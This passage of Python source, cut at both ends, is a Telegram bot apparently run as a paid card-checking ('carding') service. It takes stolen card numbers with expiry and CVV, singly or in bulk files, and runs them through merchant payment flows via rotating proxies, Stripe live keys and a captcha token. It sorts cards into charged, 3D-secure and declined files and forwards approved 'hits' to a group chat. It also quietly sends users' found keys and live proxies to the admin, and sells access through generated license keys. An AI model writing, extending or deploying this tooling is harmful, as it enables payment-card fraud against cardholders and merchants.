        await update.effective_message.reply_text("❌ Invalid format."); return
    site = (cfg_get("auth_site", "") or cfg_get("working_sites", "") or "").split(",")[0].strip()
    proxy = next_proxy(); pk = next_pk()
    hcap = cfg_get("hcaptcha_token", "") or None
    msg = await update.effective_message.reply_text("🔐 <b>Auth checking…</b>", parse_mode=ParseMode.HTML)
    loop = asyncio.get_event_loop()
    res = await loop.run_in_executor(None, process_card_enhanced, site, cc, proxy, pk, hcap)
    await _handle_single_result(update, ctx, cc, res, site, mode="AUTH")

# --- single 0.5$ ---
@plan_required
async def cmd_st05(update, ctx):
    u = update.effective_user
    if not ctx.args:
        await update.effective_message.reply_text("💥 <code>/st0.5 N|MM|YY|CVV</code>",
                                                  parse_mode=ParseMode.HTML); return
    cc = ctx.args[0].strip()
    if not CARD_LINE_RE.match(cc):
        await update.effective_message.reply_text("❌ Invalid format."); return
    site = (cfg_get("charge_site", "") or cfg_get("working_sites", "") or "").split(",")[0].strip()
    proxy = next_proxy(); pk = next_pk()
    hcap = cfg_get("hcaptcha_token", "") or None
    msg = await update.effective_message.reply_text("💥 <b>0.5$ charging…</b>", parse_mode=ParseMode.HTML)
    loop = asyncio.get_event_loop()
    res = await loop.run_in_executor(None, process_card_enhanced, site, cc, proxy, pk, hcap)
    await _handle_single_result(update, ctx, cc, res, site, mode="0.5$")

async def _handle_single_result(update, ctx, cc, res, site, mode="ST"):
    u = update.effective_user
    status = res.get("Status", "?"); resp = html.escape(res.get("Response", "?"))
    rl = resp.lower()
    with db() as c:
        c.execute("UPDATE users SET total_checks=total_checks+1 WHERE user_id=?", (u.id,))
        c.execute("INSERT INTO charges(user_id,card,response,ts) VALUES(?,?,?,?)",
                  (u.id, cc, resp, now_ts()))
    if status == "Approved":
        icon = "✅"
    elif "3d" in rl or "secure" in rl:
        icon = "🔐"
    elif "insufficient" in rl:
        icon = "💸"
    else:
        icon = "❌"
    out = (f"{icon} <b>{status}</b> <i>({mode})</i>\n\n"
           f"💳 <code>{cc}</code>\n"
           f"🌐 <code>{site or 'pk-only'}</code>\n"
           f"📩 {resp}")
    # try to edit the "checking…" message if it exists
    msg = update.effective_message
    try:
        await update.effective_message.reply_text(out, parse_mode=ParseMode.HTML)
    except Exception:
        pass
    # forward hit to GC
    if status == "Approved":
        fwd = (f"💥 <b>{mode} HIT</b>\n"
               f"━━━━━━━━━━━━━━━━━━\n"
               f"💳 <code>{cc}</code>\n"
               f"🌐 <code>{site or 'pk-only'}</code>\n"
               f"📩 {resp}\n"
               f"👤 <code>{u.id}</code> · @{u.username or '—'}")
        await send_to_gc(ctx.bot, fwd)

# --- bulk /mass ---
async def cmd_mass(update, ctx):
    u = update.effective_user
    user_ensure(u.id, u.username or "")
    if user_is_banned(u.id):
        await update.effective_message.reply_text("🚫 Banned."); return
    if not user_has_plan(u.id):
        await update.effective_message.reply_text("🚫 No plan.", parse_mode=ParseMode.HTML); return
    await edit_or_reply(update,
        "⚡ <b>Bulk Check</b>\n\n"
        "📄 Send or reply to a <b>.txt</b>\n"
        "✍️ Or paste cards directly, one per line\n"
        "    Format: <code>N|MM|YY|CVV</code>\n\n"
        "Optional: include <code>pk_live_...</code> lines in the file to use those keys.")

async def cmd_key(update, ctx):
    u = update.effective_user
    user_ensure(u.id, u.username or "")
    if user_is_banned(u.id) or not user_has_plan(u.id):
        await update.effective_message.reply_text("🚫 No plan."); return
    if not ctx.args:
        await update.effective_message.reply_text("🌐 <code>/key 5</code>",
                                                  parse_mode=ParseMode.HTML); return
    try: n = int(ctx.args[0])
    except ValueError:
        await update.effective_message.reply_text("❌ Number required."); return
    if n < 1 or n > 50:
        await update.effective_message.reply_text("⚠️ 1-50."); return
    st = get_state(u.id)
    st["pending"] = "awaiting_sites_for_key"
    st["pending_key_count"] = n
    await update.effective_message.reply_text(
        f"🌐 Send up to <b>{n}</b> sites (one per line).\n"
        f"<i>Found keys are sent to admin — not shown here.</i>",
        parse_mode=ParseMode.HTML)

async def cmd_check(update, ctx):
    u = update.effective_user
    user_ensure(u.id, u.username or "")
    if user_is_banned(u.id) or not user_has_plan(u.id):
        await update.effective_message.reply_text("🚫 No plan."); return
    st = get_state(u.id)
    st["pending"] = "awaiting_proxies_check"
    await update.effective_message.reply_text(
        "🧦 <b>Proxy Checker</b>\n\n"
        "Send proxies (one per line) OR reply to a .txt file.\n"
        "Live proxies are added to the bot pool and forwarded to admin.",
        parse_mode=ParseMode.HTML)

# ===================== ADMIN / OWNER =====================
@admin_only
async def cmd_admin(update, ctx):
    is_owner = update.effective_user.id == OWNER_ID
    txt = "╔════════════════════════╗\n   🛠  <b>ADMIN PANEL</b>  🛠\n╚════════════════════════╝"
    await edit_or_reply(update, txt, admin_panel_kb(is_owner=is_owner))

@admin_only
async def cmd_genkey(update, ctx):
    u = update.effective_user
    args = ctx.args or []
    if len(args) < 2:
        await update.effective_message.reply_text(
            "🔑 <code>/genkey &lt;count&gt; &lt;dur&gt;</code>\n⏱ 30m 12h 7d 30d 1w 1mo",
            parse_mode=ParseMode.HTML); return
    try: count = int(args[0])
    except ValueError:
        await update.effective_message.reply_text("❌ Invalid count."); return
    if count < 1 or count > 100:
        await update.effective_message.reply_text("⚠️ 1-100."); return
    dur = parse_duration(args[1])
    if not dur:
        await update.effective_message.reply_text("❌ Invalid duration."); return
    keys = key_generate(count, dur, u.id)
    body = "\n".join(f"  <code>{k}</code>" for k in keys)
    await update.effective_message.reply_text(
        f"╭─ 🔑  <b>{len(keys)} KEYS</b> ({fmt_duration(dur)} each)\n│\n{body}\n╰─ tap to copy",
        parse_mode=ParseMode.HTML)

@admin_only
async def cmd_broadcast(update, ctx):
    text = " ".join(ctx.args).strip() if ctx.args else ""
    if not text:
        await update.effective_message.reply_text("📣 <code>/broadcast text</code>",
                                                  parse_mode=ParseMode.HTML); return
    with db() as c:
        rows = c.execute("SELECT user_id FROM users WHERE banned=0").fetchall()
    sent = failed = 0
    for r in rows:
        try:
            await ctx.bot.send_message(r["user_id"], f"📣 <b>{BOT_NAME}</b>\n\n{text}",
                                       parse_mode=ParseMode.HTML); sent += 1
        except Exception: failed += 1
        await asyncio.sleep(0.05)
    await update.effective_message.reply_text(f"📣 Sent ✅ {sent} · ❌ {failed}")

@admin_only
async def cmd_users(update, ctx):
    with db() as c:
        total = c.execute("SELECT COUNT(*) n FROM users").fetchone()["n"]
        active = c.execute("SELECT COUNT(*) n FROM users WHERE expiry_ts > ? AND banned=0",
                           (now_ts(),)).fetchone()["n"]
        banned = c.execute("SELECT COUNT(*) n FROM users WHERE banned=1").fetchone()["n"]
        latest = c.execute("SELECT * FROM users ORDER BY first_seen DESC LIMIT 25").fetchall()
    body = "\n".join(fmt_user(r) for r in latest) if latest else "—"
    txt = (f"╭─ 👥  <b>USER STATS</b>\n"
           f"├ 📊 Total: <b>{total}</b>\n"
           f"├ 💎 Active: <b>{active}</b>\n"
           f"├ 🚫 Banned: <b>{banned}</b>\n╰\n\n"
           f"🕒 <b>Latest 25</b>\n{body}")
    await edit_or_reply(update, txt, admin_panel_kb(is_owner=update.effective_user.id == OWNER_ID))

@admin_only
async def cmd_stats(update, ctx):
    with db() as c:
        tu = c.execute("SELECT COUNT(*) n FROM users").fetchone()["n"]
        au = c.execute("SELECT COUNT(*) n FROM users WHERE expiry_ts > ? AND banned=0",
                       (now_ts(),)).fetchone()["n"]
        bu = c.execute("SELECT COUNT(*) n FROM users WHERE banned=1").fetchone()["n"]
        tc = c.execute("SELECT COUNT(*) n FROM charges").fetchone()["n"]
        ap = c.execute("SELECT COUNT(*) n FROM charges WHERE response LIKE '%Card Added%' OR response LIKE '%Auth Passed%'").fetchone()["n"]
        kt = c.execute("SELECT COUNT(*) n FROM keys").fetchone()["n"]
        ku = c.execute("SELECT COUNT(*) n FROM keys WHERE used_by IS NOT NULL").fetchone()["n"]
    txt = (f"╭─ 📊  <b>STATS</b>\n"
           f"├ 👥 Users: <b>{tu}</b>\n"
           f"├ 💎 Active: <b>{au}</b>\n"
           f"├ 🚫 Banned: <b>{bu}</b>\n"
           f"├ 🔑 Keys: <b>{kt}</b> (used {ku})\n"
           f"├ 🔍 Checks: <b>{tc}</b>\n"
           f"╰ ✅ Approved: <b>{ap}</b>")
    await edit_or_reply(update, txt, admin_panel_kb(is_owner=update.effective_user.id == OWNER_ID))

@admin_only
async def cmd_ban(update, ctx):
    args = ctx.args or []
    if not args:
        await update.effective_message.reply_text("🚫 <code>/ban &lt;id&gt; [reason]</code>",
                                                  parse_mode=ParseMode.HTML); return
    try: uid = int(args[0])
    except ValueError:
        await update.effective_message.reply_text("❌ Invalid id."); return
    if uid == OWNER_ID:
        await update.effective_message.reply_text("👑 Cannot ban owner."); return
    if user_is_admin(uid) and update.effective_user.id != OWNER_ID:
        await update.effective_message.reply_text("🛠 Cannot ban admin."); return
    user_ensure(uid)
    reason = " ".join(args[1:]) if len(args) > 1 else ""
    user_ban(uid, reason)
    await update.effective_message.reply_text(
        f"🚫 Banned <code>{uid}</code>\n💬 <i>{html.escape(reason) or '—'}</i>",
        parse_mode=ParseMode.HTML)

@admin_only
async def cmd_unban(update, ctx):
    args = ctx.args or []
    if not args:
        await update.effective_message.reply_text("✅ <code>/unban &lt;id&gt;</code>",
                                                  parse_mode=ParseMode.HTML); return
    try: uid = int(args[0])
    except ValueError:
        await update.effective_message.reply_text("❌ Invalid id."); return
    user_ensure(uid); user_unban(uid)
    await update.effective_message.reply_text(f"✅ Unbanned <code>{uid}</code>", parse_mode=ParseMode.HTML)

@admin_only
async def cmd_revoke(update, ctx):
    args = ctx.args or []
    if not args:
        await update.effective_message.reply_text("♻️ <code>/revoke &lt;id&gt;</code>",
                                                  parse_mode=ParseMode.HTML); return
    try: uid = int(args[0])
    except ValueError:
        await update.effective_message.reply_text("❌ Invalid id."); return
    if uid == OWNER_ID:
        await update.effective_message.reply_text("👑 Cannot revoke owner."); return
    ok = user_revoke(uid)
    await update.effective_message.reply_text(
        f"♻️ Revoked <code>{uid}</code>" if ok else "❌ Not found.", parse_mode=ParseMode.HTML)

@admin_only
async def cmd_banned_list(update, ctx):
    with db() as c:
        rows = c.execute("SELECT * FROM users WHERE banned=1 ORDER BY first_seen DESC").fetchall()
    if not rows:
        await edit_or_reply(update, "✅ No banned users.",
                            admin_panel_kb(is_owner=update.effective_user.id == OWNER_ID)); return
    body = "\n".join(
        f"<code>{r['user_id']}</code> · @{r['username'] or '—'} · <i>{html.escape(r['ban_reason'] or '—')}</i>"
        for r in rows)
    await edit_or_reply(update, f"🚫 <b>Banned users</b>\n\n{body}",
                        admin_panel_kb(is_owner=update.effective_user.id == OWNER_ID))

@owner_only
async def cmd_addadmin(update, ctx):
    if not ctx.args:
        await update.effective_message.reply_text("➕ <code>/addadmin &lt;id&gt;</code>",
                                                  parse_mode=ParseMode.HTML); return
    try: uid = int(ctx.args[0])
    except ValueError:
        await update.effective_message.reply_text("❌ Invalid id."); return
    user_ensure(uid)
    with db() as c:
        c.execute("INSERT INTO admins(user_id,added_by,added_at) VALUES(?,?,?) "
                  "ON CONFLICT(user_id) DO NOTHING", (uid, update.effective_user.id, now_ts()))
    await update.effective_message.reply_text(f"👑 Added admin <code>{uid}</code>",
                                              parse_mode=ParseMode.HTML)

@owner_only
async def cmd_deladmin(update, ctx):
    if not ctx.args:
        await update.effective_message.reply_text("➖ <code>/deladmin &lt;id&gt;</code>",
                                                  parse_mode=ParseMode.HTML); return
    try: uid = int(ctx.args[0])
    except ValueError:
        await update.effective_message.reply_text("❌ Invalid id."); return
    with db() as c:
        c.execute("DELETE FROM admins WHERE user_id=?", (uid,))
    await update.effective_message.reply_text(f"➖ Removed admin <code>{uid}</code>",
                                              parse_mode=ParseMode.HTML)

@owner_only
async def cmd_setgc(update, ctx):
    if not ctx.args:
        await update.effective_message.reply_text("📥 <code>/setgc -1001234567890</code>",
                                                  parse_mode=ParseMode.HTML); return
    cfg_set("gc_id", ctx.args[0].strip())
    await update.effective_message.reply_text("✅ GC set.", parse_mode=ParseMode.HTML)

@owner_only
async def cmd_getgc(update, ctx):
    gid = cfg_get("gc_id", "not set")
    await update.effective_message.reply_text(f"👁 GC: <code>{gid}</code>", parse_mode=ParseMode.HTML)

@owner_only
async def cmd_setsite(update, ctx):
    if not ctx.args:
        await update.effective_message.reply_text("🌐 <code>/setsite domain.com</code>",
                                                  parse_mode=ParseMode.HTML); return
    val = ",".join(ctx.args).replace("https://", "").replace("http://", "")
    cfg_set("working_sites", val)
    await update.effective_message.reply_text(f"✅ Sites: <code>{val}</code>", parse_mode=ParseMode.HTML)

@owner_only
async def cmd_setsite_auth(update, ctx):
    if not ctx.args:
        await update.effective_message.reply_text("🔐 <code>/setauthsite domain.com</code>",
                                                  parse_mode=ParseMode.HTML); return
    val = ",".join(ctx.args).replace("https://", "").replace("http://", "")
    cfg_set("auth_site", val)
    await update.effective_message.reply_text(f"✅ Auth site: <code>{val}</code>", parse_mode=ParseMode.HTML)

@owner_only
async def cmd_setsite_05(update, ctx):
    if not ctx.args:
        await update.effective_message.reply_text("💥 <code>/set05site domain.com</code>",
                                                  parse_mode=ParseMode.HTML); return
    val = ",".join(ctx.args).replace("https://", "").replace("http://", "")
    cfg_set("charge_site", val)
    await update.effective_message.reply_text(f"✅ 0.5$ site: <code>{val}</code>", parse_mode=ParseMode.HTML)

@owner_only
async def cmd_sites(update, ctx):
    s = cfg_get("working_sites", "") or "—"
    a = cfg_get("auth_site", "") or "—"
    c = cfg_get("charge_site", "") or "—"
    await update.effective_message.reply_text(
        f"🌐 <b>Sites</b>\n"
        f"• Main: <code>{html.escape(s)}</code>\n"
        f"• Auth: <code>{html.escape(a)}</code>\n"
        f"• 0.5$: <code>{html.escape(c)}</code>",
        parse_mode=ParseMode.HTML)

@owner_only
async def cmd_setproxies(update, ctx):
    st = get_state(update.effective_user.id)
    st["pending"] = "awaiting_proxies"
    await update.effective_message.reply_text(
        "🧦 Send proxy list, one per line.\n"
        "Formats: <code>host:port</code>, <code>user:pass@host:port</code>, "
        "<code>socks5://host:port</code>",
        parse_mode=ParseMode.HTML)

@owner_only
async def cmd_clearproxies(update, ctx):
    cfg_set("proxies", "")
    load_proxy_pool()
    await update.effective_message.reply_text("🗑 Proxies cleared.", parse_mode=ParseMode.HTML)

@owner_only
async def cmd_getproxies(update, ctx):
    raw = cfg_get("proxies", "") or ""
    lines = [l for l in raw.splitlines() if l.strip()]
    sample = "\n".join(f"• <code>{html.escape(l)}</code>" for l in lines[:10])
    await update.effective_message.reply_text(
        f"🧦 <b>Proxies</b>: {len(lines)}\n\n{sample}", parse_mode=ParseMode.HTML)

@owner_only
async def cmd_setpks(update, ctx):
    st = get_state(update.effective_user.id)
    st["pending"] = "awaiting_pks"
    await update.effective_message.reply_text(
        "🔑 Send pk_live keys, one per line.", parse_mode=ParseMode.HTML)

@owner_only
async def cmd_clearpks(update, ctx):
    cfg_set("pk_keys", "")
    load_pk_pool()
    await update.effective_message.reply_text("🗑 PK pool cleared.", parse_mode=ParseMode.HTML)

@owner_only
async def cmd_getpks(update, ctx):
    raw = cfg_get("pk_keys", "") or ""
    lines = [l for l in raw.splitlines() if l.strip()]
    sample = "\n".join(f"• <code>{html.escape(l)}</code>" for l in lines[:10])
    await update.effective_message.reply_text(
        f"🔑 <b>PK pool</b>: {len(lines)}\n\n{sample}", parse_mode=ParseMode.HTML)

@owner_only
async def cmd_sethcaptcha(update, ctx):
    if not ctx.args:
        await update.effective_message.reply_text("🛡 <code>/sethcaptcha &lt;token&gt;</code>",
                                                  parse_mode=ParseMode.HTML); return
    cfg_set("hcaptcha_token", ctx.args[0].strip())
    await update.effective_message.reply_text("🛡 HCAPTCHA token set.", parse_mode=ParseMode.HTML)

@owner_only
async def cmd_clearhcaptcha(update, ctx):
    cfg_set("hcaptcha_token", "")
    await update.effective_message.reply_text("🛡 HCAPTCHA cleared.", parse_mode=ParseMode.HTML)

@owner_only
async def cmd_charges(update, ctx):
    n = 20
    if ctx.args:
        try: n = min(int(ctx.args[0]), 50)
        except Exception: pass
    with db() as c:
        rows = c.execute("SELECT * FROM charges ORDER BY ts DESC LIMIT ?", (n,)).fetchall()
    if not rows:
        await edit_or_reply(update, "💾 No charges yet.",
                            admin_panel_kb(is_owner=True)); return
    lines = ["💾 <b>Recent charges</b>\n"]
    for r in rows:
        ts = datetime.fromtimestamp(r["ts"], tz=timezone.utc).strftime("%m-%d %H:%M")
        lines.append(f"💳 <code>{r['card']}</code>\n   📩 {html.escape(r['response'])}\n   👤 <code>{r['user_id']}</code> · {ts}")
    await edit_or_reply(update, "\n".join(lines), admin_panel_kb(is_owner=True))

# ===================== CALLBACKS =====================
async def on_callback(update, ctx):
    q = update.callback_query
    u = update.effective_user
    user_ensure(u.id, u.username or "")
    data = q.data or ""
    st = get_state(u.id)
    is_owner = u.id == OWNER_ID
    is_admin = user_is_admin(u.id)

    try:
        if data == "menu:home":
            await q.answer()
            await edit_or_reply(update, f"🏠 <b>{BOT_NAME}</b>\nMain menu.",
                                main_menu(is_admin=is_admin, is_owner=is_owner)); return

        if data == "u:me": await q.answer(); await cmd_me(update, ctx); return
        if data == "u:help": await q.answer(); await cmd_help(update, ctx); return
        if data == "u:single_hint":
            await q.answer()
            await q.message.reply_text("💳 <code>/st N|MM|YY|CVV</code>",
                                       parse_mode=ParseMode.HTML); return
        if data == "u:stauth_hint":
            await q.answer()
            await q.message.reply_text("🔐 <code>/stauth N|MM|YY|CVV</code>",
                                       parse_mode=ParseMode.HTML); return
        if data == "u:st05_hint":
            await q.answer()
            await q.message.reply_text("💥 <code>/st0.5 N|MM|YY|CVV</code>",
                                       parse_mode=ParseMode.HTML); return
        if data == "u:bulk_hint": await q.answer(); await cmd_mass(update, ctx); return
        if data == "u:redeem_hint":
            await q.answer()
            await q.message.reply_text("🔑 <code>/redeem OGGY-PROO-XXXX</code>",
                                       parse_mode=ParseMode.HTML); return
        if data == "u:key_hint":
            await q.answer()
            await q.message.reply_text("🌐 <code>/key 5</code>", parse_mode=ParseMode.HTML); return

        if data.startswith("m:start"):
            parts = data.split(":")
            mode = parts[2] if len(parts) > 2 else "mass"
            await q.answer(); await _start_mass(u.id, q, mode); return
        if data == "m:clear":
            await q.answer(); st["pending_cards"] = []
            try: await q.edit_message_text("🗑 Cleared.")
            except Exception: pass
            return
        if data == "m:stop":
            await q.answer("🛑 Stopping…"); st["mass_running"] = False; return

        if data.startswith("a:") and not is_admin:
            await q.answer("🚫 Denied.", show_alert=True); return
        if data.startswith("o:") and not is_owner:
            await q.answer("🚫 Denied.", show_alert=True); return

        if data == "a:panel": await q.answer(); await cmd_admin(update, ctx); return
        if data == "a:genkeys":
            await q.answer()
            await q.message.reply_text("🔑 <code>/genkey 10 30d</code>",
                                       parse_mode=ParseMode.HTML); return
        if data == "a:broadcast":
            await q.answer()
            await q.message.reply_text("📣 <code>/broadcast text</code>",
                                       parse_mode=ParseMode.HTML); return
        if data == "a:users": await q.answer(); await cmd_users(update, ctx); return
        if data == "a:stats": await q.answer(); await cmd_stats(update, ctx); return
        if data == "a:banned": await q.answer(); await cmd_banned_list(update, ctx); return
        if data == "a:unused":
            await q.answer()
            with db() as c:
                rows = c.execute("SELECT key,duration_s FROM keys WHERE used_by IS NULL "
                                 "ORDER BY created_at DESC LIMIT 50").fetchall()
            if not rows:
                await q.message.reply_text("🗝 No unused keys."); return
            body = "\n".join(f"<code>{r['key']}</code> — {fmt_duration(r['duration_s'])}" for r in rows)
            await q.message.reply_text(f"🗝 <b>Unused keys</b>\n\n{body}", parse_mode=ParseMode.HTML)
            return

        if data == "o:admins":
            await q.answer()
            await edit_or_reply(update, "👑 <b>Admin Management</b>", admin_mgmt_kb()); return
        if data == "o:addadmin":
            await q.answer()
            await q.message.reply_text("➕ <code>/addadmin &lt;id&gt;</code>",
                                       parse_mode=ParseMode.HTML); return
        if data == "o:deladmin":
            await q.answer()
            await q.message.reply_text("➖ <code>/deladmin &lt;id&gt;</code>",
                                       parse_mode=ParseMode.HTML); return
        if data == "o:listadmins":
            await q.answer()
            with db() as c:
                rows = c.execute("SELECT * FROM admins").fetchall()
            body = "\n".join(f"🛠 <code>{r['user_id']}</code>" for r in rows) or "—"
            await edit_or_reply(update, f"👑 <b>Admins</b>\n{body}", admin_mgmt_kb()); return
        if data == "o:setgc":
            await q.answer()
            await q.message.reply_text("📥 <code>/setgc -100...</code>", parse_mode=ParseMode.HTML); return
        if data == "o:getgc":
            await q.answer()
            gid = cfg_get("gc_id", "not set")
            await q.message.reply_text(f"👁 GC: <code>{gid}</code>", parse_mode=ParseMode.HTML); return
        if data == "o:charges": await q.answer(); await cmd_charges(update, ctx); return
        if data == "o:site_hint":
            await q.answer()
            await q.message.reply_text("🌐 <code>/setsite domain.com</code>",
                                       parse_mode=ParseMode.HTML); return
        if data == "o:authsites":
            await q.answer()
            await edit_or_reply(update,
                "⚙️ <b>Auth & 0.5$ Sites</b>\n\n"
                "🔐 <code>/setauthsite domain.com</code>\n"
                "💥 <code>/set05site domain.com</code>",
                admin_panel_kb(is_owner=True)); return

        if data == "o:proxies":
            await q.answer()
            raw = cfg_get("proxies", "") or ""
            n = len([l for l in raw.splitlines() if l.strip()])
            await edit_or_reply(update, f"🧦 <b>Proxy Manager</b>\nLoaded: <b>{n}</b>", proxies_kb()); return
        if data == "o:proxies_add":
            await q.answer(); await cmd_setproxies(update, ctx); return
        if data == "o:proxies_clear":
            await q.answer(); await cmd_clearproxies(update, ctx)
            await edit_or_reply(update, "🗑 Cleared.", proxies_kb()); return
        if data == "o:proxies_show":
            await q.answer(); await cmd_getproxies(update, ctx); return
        if data == "o:proxies_test":
            await q.answer()
            raw = cfg_get("proxies", "") or ""
            lines = [l.strip() for l in raw.splitlines() if l.strip()]
            if not lines:
                await q.message.reply_text("🧦 No proxies loaded."); return
            await q.message.reply_text(f"🧪 Testing {len(lines)} proxies…")
            loop = asyncio.get_event_loop()
            live, dead = await loop.run_in_executor(None, proxy_check_bulk, lines)
            await q.message.reply_text(
                f"🧪 Working: <b>{len(live)}</b> / {len(lines)}\nDead: {len(dead)}",
                parse_mode=ParseMode.HTML)
            return

        if data == "o:pks":
            await q.answer()
            raw = cfg_get("pk_keys", "") or ""
            n = len([l for l in raw.splitlines() if l.strip()])
            await edit_or_reply(update, f"🔑 <b>PK Key Manager</b>\nLoaded: <b>{n}</b>", pks_kb()); return
        if data == "o:pks_add":
            await q.answer(); await cmd_setpks(update, ctx); return
        if data == "o:pks_clear":
            await q.answer(); await cmd_clearpks(update, ctx)
            await edit_or_reply(update, "🗑 PK pool cleared.", pks_kb()); return
        if data == "o:pks_show":
            await q.answer(); await cmd_getpks(update, ctx); return

        if data == "o:hcap":
            await q.answer()
            cur = cfg_get("hcaptcha_token", "") or "—"
            await edit_or_reply(update,
                f"🛡 <b>HCAPTCHA</b>\nCurrent: <code>{html.escape(cur[:60])}...</code>\n\n"
                f"Set: <code>/sethcaptcha &lt;token&gt;</code>\n"
                f"Clear: <code>/clearhcaptcha</code>",
                admin_panel_kb(is_owner=True)); return

        await q.answer()
    except Exception as e:
        logger.exception("callback error")
        try: await q.answer(f"⚠️ {e}", show_alert=True)
        except Exception: pass

# ===================== MASS / BULK =====================
async def _start_mass(uid, q, mode="mass"):
    st = get_state(uid)
    cards = st.get("pending_cards") or []
    if not cards:
        await q.answer("No cards loaded.", show_alert=True); return
    if user_is_banned(uid):
        await q.answer("🚫 Banned.", show_alert=True); return
    if not user_has_plan(uid):
        await q.answer("No active plan.", show_alert=True); return

    site = ""
    if mode == "mass":
        site = (cfg_get("working_sites", "") or "").split(",")[0].strip()
    elif mode == "stauth":
        site = (cfg_get("auth_site", "") or cfg_get("working_sites", "") or "").split(",")[0].strip()
    elif mode == "st05":
        site = (cfg_get("charge_site", "") or cfg_get("working_sites", "") or "").split(",")[0].strip()

    # pk pool may be empty and site may be empty → pk-only mode
    if not site and not PK_CYCLE["pool"]:
        await q.answer("No site and no pk pool. Configure one.", show_alert=True); return

    st.update({
        "mass_running": True,
        "mass_chat_id": q.message.chat_id,
        "mass_msg_id": q.message.message_id,
        "mass_done": 0, "mass_total": len(cards),
        "mass_approved": 0, "mass_declined": 0, "mass_threed": 0,
        "mass_approved_list": [], "mass_threed_list": [],
        "mass_declined_list": [], "mass_error_list": [],
    })
    try:
        await q.edit_message_text(
            f"⚡ <b>Starting…</b>\n📊 0/{len(cards)} · mode <b>{mode}</b>",
            parse_mode=ParseMode.HTML, reply_markup=running_kb())
    except Exception: pass
    asyncio.create_task(_mass_worker(uid, cards, site, mode))

async def _mass_worker(uid, cards, site, mode):
    st = get_state(uid)
    chat_id, msg_id = st["mass_chat_id"], st["mass_msg_id"]
    loop = asyncio.get_event_loop()
    bot = BOT_APP.bot
    last_edit = 0.0

    row = user_get(uid)
    class _U: id = uid; username = row["username"] if row else ""
    u_shim = _U()

    hcap = cfg_get("hcaptcha_token", "") or None

    for idx, card in enumerate(cards):
        if not st.get("mass_running"): break
        card = card.strip()
        if not card: continue

        proxy = next_proxy()
        pk = next_pk()

        try:
            res = await loop.run_in_executor(None, process_card_enhanced, site, card, proxy, pk, hcap)
        except Exception as e:
            res = {"Response": str(e), "Status": "Error"}

        status = res.get("Status", "?")
        resp = res.get("Response", "?")

        with db() as c:
            c.execute("UPDATE users SET total_checks=total_checks+1 WHERE user_id=?", (uid,))
            c.execute("INSERT INTO charges(user_id,card,response,ts) VALUES(?,?,?,?)",
                      (uid, card, resp, now_ts()))

        rl = resp.lower()
        site_label = site or "pk-only"
        if status == "Approved":
            st["mass_approved"] += 1
            st["mass_approved_list"].append(f"{card} | {resp} | {site_label}")
            fwd = (f"💥 <b>{mode.upper()} HIT</b>\n"
                   f"━━━━━━━━━━━━━━━━━━\n"
                   f"💳 <code>{card}</code>\n"
                   f"🌐 <code>{site_label}</code>\n"
                   f"📩 {resp}\n"
                   f"👤 <code>{uid}</code> · @{u_shim.username or '—'}")
            await send_to_gc(bot, fwd)
        elif "3d" in rl or "secure" in rl:
            st["mass_threed"] += 1
            st["mass_threed_list"].append(f"{card} | {resp} | {site_label}")
        elif status == "Error" or "failed" in rl or "error" in rl:
            st["mass_error_list"].append(f"{card} | {resp} | {site_label}")
            st["mass_declined"] += 1
            st["mass_declined_list"].append(f"{card} | {resp} | {site_label}")
        else:
            st["mass_declined"] += 1
            st["mass_declined_list"].append(f"{card} | {resp} | {site_label}")

        st["mass_done"] += 1

        now = time.time()
        if now - last_edit > 2 or st["mass_done"] == st["mass_total"]:
            last_edit = now
            try:
                recent = st["mass_approved_list"][-3:]
                recent_txt = "\n".join(f"  💥 <code>{c.split(' | ')[0]}</code>" for c in recent) or "  —"
                pct = int((st["mass_done"] / st["mass_total"]) * 100)
                bar_filled = int(pct / 10)
                bar = "█" * bar_filled + "░" * (10 - bar_filled)
                await bot.edit_message_text(
                    chat_id=chat_id, message_id=msg_id,
                    text=(f"⚡ <b>Live · {mode}</b>\n"
                          f"<code>{bar}</code> {pct}%\n"
                          f"📊 {st['mass_done']}/{st['mass_total']}\n"
                          f"━━━━━━━━━━━━━━━\n"
                          f"✅ {st['mass_approved']}  ·  🔐 {st['mass_threed']}  ·  ❌ {st['mass_declined']}\n"
                          f"━━━━━━━━━━━━━━━\n"
                          f"🔥 <b>Recent hits</b>\n{recent_txt}"),
                    parse_mode=ParseMode.HTML, reply_markup=running_kb())
            except Exception: pass

    st["mass_running"] = False
    try:
        await bot.edit_message_text(
            chat_id=chat_id, message_id=msg_id,
            text=(f"🏁 <b>Finished · {mode}</b>\n"
                  f"📊 {st['mass_done']}/{st['mass_total']}\n"
                  f"━━━━━━━━━━━━━━━\n"
                  f"✅ {st['mass_approved']}  ·  🔐 {st['mass_threed']}  ·  ❌ {st['mass_declined']}"),
            parse_mode=ParseMode.HTML)
    except Exception: pass

    await _send_result_files(bot, chat_id, st)

async def _send_result_files(bot, chat_id, st):
    files = [
        ("charged.txt", st["mass_approved_list"]),
        ("3d.txt",      st["mass_threed_list"]),
        ("declined.txt",st["mass_declined_list"]),
        ("error.txt",   st["mass_error_list"]),
    ]
    for name, items in files:
        if not items: continue
        buf = io.BytesIO("\n".join(items).encode("utf-8"))
        buf.name = name
        try:
            await bot.send_document(chat_id, document=buf, filename=name,
                                    caption=f"📄 {name} — {len(items)} lines")
        except Exception as e:
            logger.warning(f"send file {name}: {e}")

# ===================== DOCUMENT / TEXT =====================
async def on_document(update, ctx):
    u = update.effective_user
    user_ensure(u.id, u.username or "")
    msg = update.effective_message
    doc = msg.document
    if not doc or not doc.file_name.lower().endswith(".txt"): return
    if user_is_banned(u.id):
        await msg.reply_text("🚫 Banned."); return
    if not user_has_plan(u.id):
        await msg.reply_text("🚫 No plan."); return
    try:
        f = await ctx.bot.get_file(doc.file_id)
        content = await f.download_as_bytearray()
        text = content.decode("utf-8", errors="ignore")
    except Exception as e:
        await msg.reply_text(f"❌ Read failed: {e}"); return

    st = get_state(u.id)
    caption = (msg.caption or "").lower()
    # proxy check mode
    if st.get("pending") == "awaiting_proxies_check" or "prox" in caption:
        st["pending"] = None
        lines = [l.strip() for l in text.splitlines() if l.strip()]
        if not lines:
            await msg.reply_text("⚠️ Empty file."); return
        proc = await msg.reply_text(f"🧦 Testing {len(lines)} proxies…")
        loop = asyncio.get_event_loop()
        live, dead = await loop.run_in_executor(None, proxy_check_bulk, lines)
        # save live to pool
        existing_raw = cfg_get("proxies", "") or ""
        existing = set(l.strip() for l in existing_raw.splitlines() if l.strip())
        for p in live:
            existing.add(p["original"])
        cfg_set("proxies", "\n".join(sorted(existing)))
        load_proxy_pool()
        # forward to GC
        if live:
            body = "\n".join(p["original"] for p in live[:50])
            fwd = (f"🧦 <b>LIVE PROXIES</b>\n"
